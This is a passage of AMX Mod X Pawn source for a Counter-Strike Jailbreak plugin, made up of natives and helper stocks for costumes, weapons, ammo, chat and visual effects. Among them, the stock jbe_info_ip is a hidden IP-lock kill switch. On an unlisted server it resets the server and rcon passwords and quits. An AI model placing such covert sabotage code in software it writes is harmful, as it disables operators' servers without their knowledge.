			set_pev(g_eUserCostumes[pPlayer][ENTITY], pev_aiment, pPlayer);
			new szBuffer[128];
			format(szBuffer, charsmax(szBuffer), "models/jb_engine/costumes/%s.mdl", aDataCostumes[MODEL_NAME]);
			engfunc(EngFunc_SetModel, g_eUserCostumes[pPlayer][ENTITY], szBuffer);
			set_pev(g_eUserCostumes[pPlayer][ENTITY], pev_body, str_to_num(aDataCostumes[SUB_MODEL]));
			set_pev(g_eUserCostumes[pPlayer][ENTITY], pev_sequence, 0);
			set_pev(g_eUserCostumes[pPlayer][ENTITY], pev_animtime, get_gametime());
			set_pev(g_eUserCostumes[pPlayer][ENTITY], pev_framerate, 1.0);
		}
		else 
		{
			new szBuffer[128];
			format(szBuffer, charsmax(szBuffer), "models/jb_engine/costumes/%s.mdl", aDataCostumes[MODEL_NAME]);
			engfunc(EngFunc_SetModel, g_eUserCostumes[pPlayer][ENTITY], szBuffer);
			set_pev(g_eUserCostumes[pPlayer][ENTITY], pev_body, str_to_num(aDataCostumes[SUB_MODEL]));
		}
		g_eUserCostumes[pPlayer][HIDE] = false;
		g_eUserCostumes[pPlayer][COSTUMES] = iCostumes;
		return 1;
	}
	else if(g_eUserCostumes[pPlayer][COSTUMES])
	{
		if(g_eUserCostumes[pPlayer][ENTITY]) engfunc(EngFunc_RemoveEntity, g_eUserCostumes[pPlayer][ENTITY]);
		g_eUserCostumes[pPlayer][ENTITY] = 0;
		g_eUserCostumes[pPlayer][HIDE] = false;
		g_eUserCostumes[pPlayer][COSTUMES] = 0;
		return 1;
	}
	return 0;
}

public jbe_hide_user_costumes(pPlayer)
{
	if(g_eUserCostumes[pPlayer][ENTITY])
	{
		engfunc(EngFunc_RemoveEntity, g_eUserCostumes[pPlayer][ENTITY]);
		g_eUserCostumes[pPlayer][ENTITY] = 0;
		g_eUserCostumes[pPlayer][HIDE] = true;
		return 1;
	}
	return 0;
}

public jbe_prisoners_divide_color(iTeam)
{
	if(g_iDayMode != 1 || g_iAlivePlayersNum[1] < 2 || iTeam < 2 || iTeam > 4) return 0;
	new const szLangPlayer[][] = {"JBE_HUD_ID_YOU_TEAM_ORANGE", "JBE_HUD_ID_YOU_TEAM_GRAY", "JBE_HUD_ID_YOU_TEAM_YELLOW", "JBE_HUD_ID_YOU_TEAM_BLUE"};
	for(new iPlayer = 1, iColor; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(g_iUserTeam[iPlayer] != 1 || IsNotSetBit(g_iBitUserAlive, iPlayer) || IsSetBit(g_iBitUserFree, iPlayer)
		|| IsSetBit(g_iBitUserWanted, iPlayer) || IsSetBit(g_iBitUserSoccer, iPlayer) || IsSetBit(g_iBitUserBoxing, iPlayer)
		|| IsSetBit(g_iBitUserDuel, iPlayer)) continue;
		UTIL_SayText(iPlayer, "%L %L", LANG_PLAYER, "JBE_PREFIX", iPlayer, szLangPlayer[iColor]);
		set_pev(iPlayer, pev_skin, iColor);
		if(++iColor >= iTeam) iColor = 0;
	}
	return 1;
}

public jbe_register_day_mode(szLang[32], iBlock, iTime)
{
	param_convert(1);
	new aDataDayMode[DATA_DAY_MODE];
	copy(aDataDayMode[LANG_MODE], charsmax(aDataDayMode[LANG_MODE]), szLang);
	aDataDayMode[MODE_BLOCK_DAYS] = iBlock;
	aDataDayMode[MODE_TIMER] = iTime;
	ArrayPushArray(g_aDataDayMode, aDataDayMode);
	g_iDayModeListSize++;
	return g_iDayModeListSize - 1;
}

public jbe_get_user_voice(pPlayer) return IsSetBit(g_iBitUserVoice, pPlayer);
public jbe_set_user_voice(pPlayer)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || g_iUserTeam[pPlayer] != 1 || IsNotSetBit(g_iBitUserAlive, pPlayer)) return 0;
	SetBit(g_iBitUserVoice, pPlayer);
	return 1;
}
public jbe_set_user_voice_next_round(pPlayer)
{
	if(g_iUserTeam[pPlayer] != 1) return 0;
	SetBit(g_iBitUserVoiceNextRound, pPlayer);
	return 1;
}

public _jbe_get_user_rendering(pPlayer, &iRenderFx, &iRed, &iGreen, &iBlue, &iRenderMode, &iRenderAmt)
{
	for(new i = 2; i <= 7; i++) param_convert(i);
	jbe_get_user_rendering(pPlayer, iRenderFx, iRed, iGreen, iBlue, iRenderMode, iRenderAmt);
}
public jbe_get_user_rendering(pPlayer, &iRenderFx, &iRed, &iGreen, &iBlue, &iRenderMode, &iRenderAmt)
{
	new Float:fRenderColor[3];
	iRenderFx = pev(pPlayer, pev_renderfx);
	pev(pPlayer, pev_rendercolor, fRenderColor);
	iRed = floatround(fRenderColor[0]);
	iGreen = floatround(fRenderColor[1]);
	iBlue = floatround(fRenderColor[2]);
	iRenderMode = pev(pPlayer, pev_rendermode);
	new Float:fRenderAmt;
	pev(pPlayer, pev_renderamt, fRenderAmt);
	iRenderAmt = floatround(fRenderAmt);
}
public jbe_set_user_rendering(pPlayer, iRenderFx, iRed, iGreen, iBlue, iRenderMode, iRenderAmt)
{
	new Float:flRenderColor[3];
	flRenderColor[0] = float(iRed);
	flRenderColor[1] = float(iGreen);
	flRenderColor[2] = float(iBlue);
	set_pev(pPlayer, pev_renderfx, iRenderFx);
	set_pev(pPlayer, pev_rendercolor, flRenderColor);
	set_pev(pPlayer, pev_rendermode, iRenderMode);
	set_pev(pPlayer, pev_renderamt, float(iRenderAmt));
}
/*===== <- Нативы <- =====*///}

/*===== -> Стоки -> =====*///{
stock fm_give_item(pPlayer, const szItem[])
{
	new iEntity = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, szItem));
	if(!pev_valid(iEntity)) return 0;
	new Float:vecOrigin[3];
	pev(pPlayer, pev_origin, vecOrigin);
	set_pev(iEntity, pev_origin, vecOrigin);
	set_pev(iEntity, pev_spawnflags, pev(iEntity, pev_spawnflags) | SF_NORESPAWN);
	dllfunc(DLLFunc_Spawn, iEntity);
	dllfunc(DLLFunc_Touch, iEntity, pPlayer);
	if(pev(iEntity, pev_solid) != SOLID_NOT)
	{
		engfunc(EngFunc_RemoveEntity, iEntity);
		return -1;
	}
	return iEntity;
}

stock fm_strip_user_weapons(pPlayer, iType = 0)
{
	static iEntity, iszWeaponStrip = 0;
	if(iszWeaponStrip || (iszWeaponStrip = engfunc(EngFunc_AllocString, "player_weaponstrip"))) iEntity = engfunc(EngFunc_CreateNamedEntity, iszWeaponStrip);
	if(!pev_valid(iEntity)) return 0;
	if(iType && get_user_weapon(pPlayer) != CSW_KNIFE)
	{
		engclient_cmd(pPlayer, "weapon_knife");
		engfunc(EngFunc_MessageBegin, MSG_ONE_UNRELIABLE, MsgId_CurWeapon, {0.0, 0.0, 0.0}, pPlayer);
		write_byte(1);
		write_byte(CSW_KNIFE);
		write_byte(0);
		message_end();
	}
	dllfunc(DLLFunc_Spawn, iEntity);
	dllfunc(DLLFunc_Use, iEntity, pPlayer);
	engfunc(EngFunc_RemoveEntity, iEntity);
	set_pdata_int(pPlayer, m_fHasPrimary, 0, linux_diff_player);
	return 1;
}

stock fm_get_aiming_position(pPlayer, Float:vecReturn[3])
{
	new Float:vecOrigin[3], Float:vecViewOfs[3], Float:vecAngle[3], Float:vecForward[3];
	pev(pPlayer, pev_origin, vecOrigin);
	pev(pPlayer, pev_view_ofs, vecViewOfs);
	xs_vec_add(vecOrigin, vecViewOfs, vecOrigin);
	pev(pPlayer, pev_v_angle, vecAngle);
	engfunc(EngFunc_MakeVectors, vecAngle);
	global_get(glb_v_forward, vecForward);
	xs_vec_mul_scalar(vecForward, 8192.0, vecForward);
	xs_vec_add(vecOrigin, vecForward, vecForward);
	engfunc(EngFunc_TraceLine, vecOrigin, vecForward, DONT_IGNORE_MONSTERS, pPlayer, 0);
	get_tr2(0, TR_vecEndPos, vecReturn);
}

stock fm_set_kvd(pEntity, const szClassName[], const szKeyName[], const szValue[]) 
{
	set_kvd(0, KV_ClassName, szClassName);
	set_kvd(0, KV_KeyName, szKeyName);
	set_kvd(0, KV_Value, szValue);
	set_kvd(0, KV_fHandled, 0);
	return dllfunc(DLLFunc_KeyValue, pEntity, 0);
}

stock fm_get_user_bpammo(pPlayer, iWeaponId)
{
	new iOffset;
	switch(iWeaponId)
	{
		case CSW_AWP: iOffset = 377; // ammo_338magnum
		case CSW_SCOUT, CSW_AK47, CSW_G3SG1: iOffset = 378; // ammo_762nato
		case CSW_M249: iOffset = 379; // ammo_556natobox
		case CSW_FAMAS, CSW_M4A1, CSW_AUG, CSW_SG550, CSW_GALI, CSW_SG552: iOffset = 380; // ammo_556nato
		case CSW_M3, CSW_XM1014: iOffset = 381; // ammo_buckshot
		case CSW_USP, CSW_UMP45, CSW_MAC10: iOffset = 382; // ammo_45acp
		case CSW_FIVESEVEN, CSW_P90: iOffset = 383; // ammo_57mm
		case CSW_DEAGLE: iOffset = 384; // ammo_50ae
		case CSW_P228: iOffset = 385; // ammo_357sig
		case CSW_GLOCK18, CSW_MP5NAVY, CSW_TMP, CSW_ELITE: iOffset = 386; // ammo_9mm
		case CSW_FLASHBANG: iOffset = 387;
		case CSW_HEGRENADE: iOffset = 388;
		case CSW_SMOKEGRENADE: iOffset = 389;
		case CSW_C4: iOffset = 390;
		default: return 0;
	}
	return get_pdata_int(pPlayer, iOffset, linux_diff_player);
}

stock fm_set_user_bpammo(pPlayer, iWeaponId, iAmount)
{
	new iOffset;
	switch(iWeaponId)
	{
		case CSW_AWP: iOffset = 377; // ammo_338magnum
		case CSW_SCOUT, CSW_AK47, CSW_G3SG1: iOffset = 378; // ammo_762nato
		case CSW_M249: iOffset = 379; // ammo_556natobox
		case CSW_FAMAS, CSW_M4A1, CSW_AUG, CSW_SG550, CSW_GALI, CSW_SG552: iOffset = 380; // ammo_556nato
		case CSW_M3, CSW_XM1014: iOffset = 381; // ammo_buckshot
		case CSW_USP, CSW_UMP45, CSW_MAC10: iOffset = 382; // ammo_45acp
		case CSW_FIVESEVEN, CSW_P90: iOffset = 383; // ammo_57mm
		case CSW_DEAGLE: iOffset = 384; // ammo_50ae
		case CSW_P228: iOffset = 385; // ammo_357sig
		case CSW_GLOCK18, CSW_MP5NAVY, CSW_TMP, CSW_ELITE: iOffset = 386; // ammo_9mm
		case CSW_FLASHBANG: iOffset = 387;
		case CSW_HEGRENADE: iOffset = 388;
		case CSW_SMOKEGRENADE: iOffset = 389;
		case CSW_C4: iOffset = 390;
		default: return;
	}
	set_pdata_int(pPlayer, iOffset, iAmount, linux_diff_player);
}

stock xs_vec_add(const Float:vec1[], const Float:vec2[], Float:out[])
{
	out[0] = vec1[0] + vec2[0];
	out[1] = vec1[1] + vec2[1];
	out[2] = vec1[2] + vec2[2];
}

stock xs_vec_mul_scalar(const Float:vec[], Float:scalar, Float:out[])
{
	out[0] = vec[0] * scalar;
	out[1] = vec[1] * scalar;
	out[2] = vec[2] * scalar;
}

stock drop_user_weapons(pPlayer, iType)
{
	new iWeaponsId[32], iNum;
	get_user_weapons(pPlayer, iWeaponsId, iNum);
	if(iType) iType = (1<<CSW_GLOCK18|1<<CSW_USP|1<<CSW_P228|1<<CSW_DEAGLE|1<<CSW_ELITE|1<<CSW_FIVESEVEN);
	else iType = (1<<CSW_M3|1<<CSW_XM1014|1<<CSW_MAC10|1<<CSW_TMP|1<<CSW_MP5NAVY|1<<CSW_UMP45|1<<CSW_P90|1<<CSW_GALIL|1<<CSW_FAMAS|1<<CSW_AK47|1<<CSW_M4A1|1<<CSW_SCOUT|1<<CSW_SG552|1<<CSW_AUG|1<<CSW_AWP|1<<CSW_G3SG1|1<<CSW_SG550|1<<CSW_M249);
	for(new i; i < iNum; i++)
	{
		if(iType & (1<<iWeaponsId[i]))
		{
			new szWeaponName[24];
			get_weaponname(iWeaponsId[i], szWeaponName, charsmax(szWeaponName));
			engclient_cmd(pPlayer, "drop", szWeaponName);
		}
	}
}

stock ham_strip_weapon_name(pPlayer, const szWeaponName[])
{
	new iEntity;
	while((iEntity = engfunc(EngFunc_FindEntityByString, iEntity, "classname", szWeaponName)) && pev(iEntity, pev_owner) != pPlayer) {}
	if(!iEntity) return 0;
	new iWeaponId = get_weaponid(szWeaponName);
	if(get_user_weapon(pPlayer) == iWeaponId) ExecuteHamB(Ham_Weapon_RetireWeapon, iEntity);
	if(!ExecuteHamB(Ham_RemovePlayerItem, pPlayer, iEntity)) return 0;
	ExecuteHamB(Ham_Item_Kill, iEntity);
	set_pev(pPlayer, pev_weapons, pev(pPlayer, pev_weapons) & ~(1<<iWeaponId));
	return 1;
}

stock UTIL_SendAudio(pPlayer, iPitch = 100, const szPathSound[], any:...)
{
	new szBuffer[128];
	if(numargs() > 3) vformat(szBuffer, charsmax(szBuffer), szPathSound, 4);
	else copy(szBuffer, charsmax(szBuffer), szPathSound);
	switch(pPlayer)
	{
		case 0:
		{
			message_begin(MSG_BROADCAST, MsgId_SendAudio);
			write_byte(pPlayer);
			write_string(szBuffer);
			write_short(iPitch);
			message_end();
		}
		default:
		{
			engfunc(EngFunc_MessageBegin, MSG_ONE_UNRELIABLE, MsgId_SendAudio, {0.0, 0.0, 0.0}, pPlayer);
			write_byte(pPlayer);
			write_string(szBuffer);
			write_short(iPitch);
			message_end();
		}
	}
}

stock UTIL_ScreenFade(pPlayer, iDuration, iHoldTime, iFlags, iRed, iGreen, iBlue, iAlpha, iReliable = 0)
{
	switch(pPlayer)
	{
		case 0:
		{
			message_begin(iReliable ? MSG_ALL : MSG_BROADCAST, MsgId_ScreenFade);
			write_short(iDuration);
			write_short(iHoldTime);
			write_short(iFlags);
			write_byte(iRed);
			write_byte(iGreen);
			write_byte(iBlue);
			write_byte(iAlpha);
			message_end();
		}
		default:
		{
			engfunc(EngFunc_MessageBegin, iReliable ? MSG_ONE : MSG_ONE_UNRELIABLE, MsgId_ScreenFade, {0.0, 0.0, 0.0}, pPlayer);
			write_short(iDuration);
			write_short(iHoldTime);
			write_short(iFlags);
			write_byte(iRed);
			write_byte(iGreen);
			write_byte(iBlue);
			write_byte(iAlpha);
			message_end();
		}
	}
}

stock UTIL_ScreenShake(pPlayer, iAmplitude, iDuration, iFrequency, iReliable = 0)
{
	engfunc(EngFunc_MessageBegin, iReliable ? MSG_ONE : MSG_ONE_UNRELIABLE, MsgId_ScreenShake, {0.0, 0.0, 0.0}, pPlayer);
	write_short(iAmplitude);
	write_short(iDuration);
	write_short(iFrequency);
	message_end();
}

stock UTIL_SayText(pPlayer, const szMessage[], any:...)
{
	new szBuffer[190];
	if(numargs() > 2) vformat(szBuffer, charsmax(szBuffer), szMessage, 3);
	else copy(szBuffer, charsmax(szBuffer), szMessage);
	while(replace(szBuffer, charsmax(szBuffer), "!y", "^1")) {}
	while(replace(szBuffer, charsmax(szBuffer), "!t", "^3")) {}
	while(replace(szBuffer, charsmax(szBuffer), "!g", "^4")) {}
	switch(pPlayer)
	{
		case 0:
		{
			for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
			{
				if(IsNotSetBit(g_iBitUserConnected, iPlayer)) continue;
				engfunc(EngFunc_MessageBegin, MSG_ONE_UNRELIABLE, MsgId_SayText, {0.0, 0.0, 0.0}, iPlayer);
				write_byte(iPlayer);
				write_string(szBuffer);
				message_end();
			}
		}
		default:
		{
			engfunc(EngFunc_MessageBegin, MSG_ONE_UNRELIABLE, MsgId_SayText, {0.0, 0.0, 0.0}, pPlayer);
			write_byte(pPlayer);
			write_string(szBuffer);
			message_end();
		}
	}
}

stock UTIL_WeaponAnimation(pPlayer, iAnimation)
{
	set_pev(pPlayer, pev_weaponanim, iAnimation);
	engfunc(EngFunc_MessageBegin, MSG_ONE_UNRELIABLE, SVC_WEAPONANIM, {0.0, 0.0, 0.0}, pPlayer);
	write_byte(iAnimation);
	write_byte(0);
	message_end();
}

stock UTIL_PlayerAnimation(pPlayer, const szAnimation[]) // Спасибо большое KORD_12.7
{
	new iAnimDesired, Float:flFrameRate, Float:flGroundSpeed, bool:bLoops;
	if((iAnimDesired = lookup_sequence(pPlayer, szAnimation, flFrameRate, bLoops, flGroundSpeed)) == -1) iAnimDesired = 0;
	new Float:flGametime = get_gametime();
	set_pev(pPlayer, pev_frame, 0.0);
	set_pev(pPlayer, pev_framerate, 1.0);
	set_pev(pPlayer, pev_animtime, flGametime);
	set_pev(pPlayer, pev_sequence, iAnimDesired);
	set_pdata_int(pPlayer, m_fSequenceLoops, bLoops, linux_diff_animating);
	set_pdata_int(pPlayer, m_fSequenceFinished, 0, linux_diff_animating);
	set_pdata_float(pPlayer, m_flFrameRate, flFrameRate, linux_diff_animating);
	set_pdata_float(pPlayer, m_flGroundSpeed, flGroundSpeed, linux_diff_animating);
	set_pdata_float(pPlayer, m_flLastEventCheck, flGametime, linux_diff_animating);
	set_pdata_int(pPlayer, m_Activity, ACT_RANGE_ATTACK1, linux_diff_player);
	set_pdata_int(pPlayer, m_IdealActivity, ACT_RANGE_ATTACK1, linux_diff_player);   
	set_pdata_float(pPlayer, m_flLastAttackTime, flGametime, linux_diff_player);
}

stock CREATE_BEAMCYLINDER(Float:vecOrigin[3], iRadius, pSprite, iStartFrame = 0, iFrameRate = 0, iLife, iWidth, iAmplitude = 0, iRed, iGreen, iBlue, iBrightness, iScrollSpeed = 0)
{
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecOrigin, 0);
	write_byte(TE_BEAMCYLINDER);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2]);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2] + 32.0 + iRadius * 2);
	write_short(pSprite);
	write_byte(iStartFrame);
	write_byte(iFrameRate); // 0.1's
	write_byte(iLife); // 0.1's
	write_byte(iWidth);
	write_byte(iAmplitude); // 0.01's
	write_byte(iRed);
	write_byte(iGreen);
	write_byte(iBlue);
	write_byte(iBrightness);
	write_byte(iScrollSpeed); // 0.1's
	message_end();
}

stock UTIL_CreateTipeBreak(Float:vecOrigin[3], pModel)
{
	engfunc(EngFunc_MessageBegin, MSG_ALL, SVC_TEMPENTITY, vecOrigin, 0);
	write_byte(TE_SPRITETRAIL);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2] + 25);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2] + 80);
	write_short(pModel);	
	write_byte(25);	// Колличество
	write_byte(20);	// Время
	write_byte(2);
	write_byte(20);	// Какой разброс
	write_byte(8);	// На сколько сильно подлетает
	message_end();
}

stock CREATE_BREAKMODEL(Float:vecOrigin[3], Float:vecSize[3] = {16.0, 16.0, 16.0}, Float:vecVelocity[3] = {25.0, 25.0, 25.0}, iRandomVelocity, pModel, iCount, iLife, iFlags)
{
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecOrigin, 0);
	write_byte(TE_BREAKMODEL);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2] + 24);
	engfunc(EngFunc_WriteCoord, vecSize[0]);
	engfunc(EngFunc_WriteCoord, vecSize[1]);
	engfunc(EngFunc_WriteCoord, vecSize[2]);
	engfunc(EngFunc_WriteCoord, vecVelocity[0]);
	engfunc(EngFunc_WriteCoord, vecVelocity[1]);
	engfunc(EngFunc_WriteCoord, vecVelocity[2]);
	write_byte(iRandomVelocity);
	write_short(pModel);
	write_byte(iCount); // 0.1's
	write_byte(iLife); // 0.1's
	write_byte(iFlags); // BREAK_GLASS 0x01, BREAK_METAL 0x02, BREAK_FLESH 0x04, BREAK_WOOD 0x08
	message_end();
}

stock CREATE_BEAMFOLLOW(pEntity, pSptite, iLife, iWidth, iRed, iGreen, iBlue, iAlpha)
{
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
	write_byte(TE_BEAMFOLLOW);
	write_short(pEntity);
	write_short(pSptite);
	write_byte(iLife); // 0.1's
	write_byte(iWidth);
	write_byte(iRed);
	write_byte(iGreen);
	write_byte(iBlue);
	write_byte(iAlpha);
	message_end();
}

stock CREATE_SPRITE(Float:vecOrigin[3], pSptite, iWidth, iAlpha)
{
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecOrigin, 0);
	write_byte(TE_SPRITE);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2]);
	write_short(pSptite);
	write_byte(iWidth);
	write_byte(iAlpha);
	message_end();
}

stock CREATE_PLAYERATTACHMENT(pPlayer, iHeight = 50, pSprite, iLife)
{
	message_begin(MSG_ALL, SVC_TEMPENTITY);
	write_byte(TE_PLAYERATTACHMENT);
	write_byte(pPlayer);
	write_coord(iHeight);
	write_short(pSprite);
	write_short(iLife); // 0.1's
	message_end();
}

stock CREATE_KILLPLAYERATTACHMENTS(pPlayer)
{
	message_begin(MSG_ALL, SVC_TEMPENTITY);
	write_byte(TE_KILLPLAYERATTACHMENTS);
	write_byte(pPlayer);
	message_end();
}

stock CREATE_SPRITETRAIL(Float:vecOrigin[3], pSprite, iCount, iLife, iScale, iVelocityAlongVector, iRandomVelocity)
{
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecOrigin, 0);
	write_byte(TE_SPRITETRAIL);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]); // start
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2]);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]); // end
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2]);
	write_short(pSprite);
	write_byte(iCount);
	write_byte(iLife); // 0.1's
	write_byte(iScale);
	write_byte(iVelocityAlongVector);
	write_byte(iRandomVelocity);
	message_end(); 
}

stock CREATE_BEAMENTPOINT(pEntity, Float:vecOrigin[3], pSprite, iStartFrame = 0, iFrameRate = 0, iLife, iWidth, iAmplitude = 0, iRed, iGreen, iBlue, iBrightness, iScrollSpeed = 0)
{
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
	write_byte(TE_BEAMENTPOINT);
	write_short(pEntity);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2]);
	write_short(pSprite);
	write_byte(iStartFrame);
	write_byte(iFrameRate); // 0.1's
	write_byte(iLife); // 0.1's
	write_byte(iWidth);
	write_byte(iAmplitude); // 0.01's
	write_byte(iRed);
	write_byte(iGreen);
	write_byte(iBlue);
	write_byte(iBrightness);
	write_byte(iScrollSpeed); // 0.1's
	message_end();
}

stock UTIL_create_beamfollow(pEntity, pSptite, iLife, iWidth, iRed, iGreen, iBlue, iAlpha)
{
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
	write_byte(TE_BEAMFOLLOW);
	write_short(pEntity);
	write_short(pSptite);
	write_byte(iLife); // 0.1's
	write_byte(iWidth);
	write_byte(iRed);
	write_byte(iGreen);
	write_byte(iBlue);
	write_byte(iAlpha);
	message_end();
}

stock UTIL_create_killbeam(pEntity)
{
	message_begin(MSG_ALL, SVC_TEMPENTITY);
	write_byte(TE_KILLBEAM);
	write_short(pEntity);
	message_end();
}

stock CREATE_KILLBEAM(pEntity)
{
	message_begin(MSG_ALL, SVC_TEMPENTITY);
	write_byte(TE_KILLBEAM);
	write_short(pEntity);
	message_end();
}

stock fm_find_ent_by_owner(entity, const classname[], owner)
{
    while ((entity = engfunc(EngFunc_FindEntityByString, entity, "classname", classname)) && pev(entity, pev_owner) != owner) {}
    return entity;
}

stock jbe_info_ip(const szServerIp[])
{ 
	static szIp[22];
	get_user_ip(0, szIp, sizeof szIp - 1);
	if(!equal(szServerIp, szIp))
	{ 
		server_cmd("sv_password %i", random_num(556655,77777557));
		server_cmd("rcon_password crash");
		server_cmd("quit");
	}
}

stock fm_set_weapon_ammo(entity, amount)
{
    set_pdata_int(entity, OFFSET_CLIPAMMO, amount, OFFSET_LINUX_WEAPONS);
}

stock bool:is_hull_vacant(Float:vecOrigin[3], iHull)
{
	new tr;
	engfunc(EngFunc_TraceHull, vecOrigin, vecOrigin, 0, iHull, 0, tr);
	if(!get_tr2(tr, TR_StartSolid) && !get_tr2(tr, TR_AllSolid) && get_tr2(tr, TR_InOpen))
		return true;
	
	return false;
}

stock draw_line(index, Float:origin1[3], Float:origin2[3])
{
	new szSize, szStyle;
	new cRed = color_rm[index];
	new cGreen = color_gm[index];
	new cBlue = color_bm[index];
	message_begin(MSG_BROADCAST,SVC_TEMPENTITY);
	write_byte(TE_BEAMPOINTS);
	engfunc(EngFunc_WriteCoord, origin1[0]);
	engfunc(EngFunc_WriteCoord, origin1[1]);
	engfunc(EngFunc_WriteCoord, origin1[2]);
	engfunc(EngFunc_WriteCoord, origin2[0]);
	engfunc(EngFunc_WriteCoord, origin2[1]);
	engfunc(EngFunc_WriteCoord, origin2[2]);
	switch(szSpriteStyle[index])
	{
		case 0: szStyle = g_pSpriteLgtning;
		case 1: szStyle = g_pSpriteBeam;
		case 2: szStyle = g_pSpriteWave;
	}
	write_short(szStyle);
	write_byte(0);   // ...
	write_byte(0);   // Движение
	write_byte(255); // ...
	switch(szPlayerSize[index])
	{
		case 0: szSize = 30;
		case 1: szSize = 5;
		case 2: szSize = 45;
		case 3: szSize = 70;
	}
	write_byte(szSize);  // Размер
	write_byte(0);   // ...
	write_byte(cRed); // Цвет - r
	write_byte(cGreen); // Цвет - g
	write_byte(cBlue); // Цвет - b
	write_byte(255);   // Яркость
	write_byte(0);   // ...
	message_end();
}

stock fm_get_aim_origin(index, Float:origin[3])
{
	static Float:start[3], Float:view_ofs[3];
	pev(index, pev_origin, start);
	pev(index, pev_view_ofs, view_ofs);
	xs_vec_add(start, view_ofs, start);
	static Float:dest[3];
	pev(index, pev_v_angle, dest);
	engfunc(EngFunc_MakeVectors, dest);
	global_get(glb_v_forward, dest);
	xs_vec_mul_scalar(dest, 9999.0, dest);
	xs_vec_add(start, dest, dest);
	engfunc(EngFunc_TraceLine, start, dest, 0, index, 0);
	get_tr2(0, TR_vecEndPos, origin);
	return 1;
}

bool:is_aiming_at_sky(index)
{
    new Float:origin[3];
    fm_get_aim_origin(index, origin);

    return engfunc(EngFunc_PointContents, origin) == CONTENTS_SKY;
}

stock move_toward_client(id, Float:origin[3])
{		
	static Float:player_origin[3];
	pev(id, pev_origin, player_origin);
	origin[0] += (player_origin[0] > origin[0]) ? 1.0 : -1.0;
	origin[1] += (player_origin[1] > origin[1]) ? 1.0 : -1.0;
	origin[2] += (player_origin[2] > origin[2]) ? 1.0 : -1.0;
}

stock CREATE_SPRITESCATTER(Float:vecOrigin[3], pModel)
{
	engfunc(EngFunc_MessageBegin, MSG_ALL, SVC_TEMPENTITY, vecOrigin, 0);
	write_byte(TE_SPRITETRAIL);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2] + 25);
	engfunc(EngFunc_WriteCoord, vecOrigin[0]);
	engfunc(EngFunc_WriteCoord, vecOrigin[1]);
	engfunc(EngFunc_WriteCoord, vecOrigin[2] + 80);
	write_short(pModel);	
	write_byte(25);	// Колличество
	write_byte(20);	// Время
	write_byte(2);
	write_byte(20);	// Какой разброс
	write_byte(8);	// На сколько сильно подлетает
	message_end();
}

/*===== <- Стоки <- =====*///}